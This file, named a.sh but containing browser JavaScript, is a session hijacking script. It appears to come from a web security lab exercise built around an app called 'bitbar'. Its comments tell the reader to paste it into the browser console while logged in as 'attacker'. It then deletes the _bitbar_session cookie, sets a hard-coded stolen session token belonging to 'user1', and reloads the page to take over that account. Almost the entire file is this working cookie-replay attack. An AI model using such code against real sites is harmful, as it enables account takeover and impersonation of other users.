#!/bin/sh
# a.sh
# This file contains JavaScript that you should paste into the browser's
# JavaScript console while logged in as `attacker`. It will overwrite the
# `_bitbar_session` cookie with the stolen `user1` session value and reload
# the page so the app treats your browser as `user1`.

(function(){
  console.log('cookie before:', document.cookie);

  // 删除旧 cookie
  document.cookie = "_bitbar_session=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";

  // 设置窃取的 session(使用当前的 stolen token)
  document.cookie = "_bitbar_session=BAh7CUkiD3Nlc3Npb25faWQGOgZFVEkiJTRjOTE5YWViMmUxNDA4NzRlZDdmZDE2N2ZkNTY2MjQyBjsAVEkiCnRva2VuBjsARkkiG2JpRW9teFh5WTRLZ1dFUzVheEViTWcGOwBGSSIRbG9nZ2VkX2luX2lkBjsARmkGSSISc3RvbGVuX2Nvb2tpZQY7AEZJIkVfYml0YmFyX3Nlc3Npb249QkFoN0NFa2lEM05sYzNOcGIyNWZhV1FHT2daRlZFa2lKVFJqT1RFNVlXVmlNbVV4BjsAVA%3D%3D--c4aaf9b0dd29cdfc3cf8c499994d628f455589b1; path=/";

  console.log('cookie after set:', document.cookie);

  // 导航到主页（避免重新提交或 GET 到 POST 路由）
  window.location.href = '/';
})();

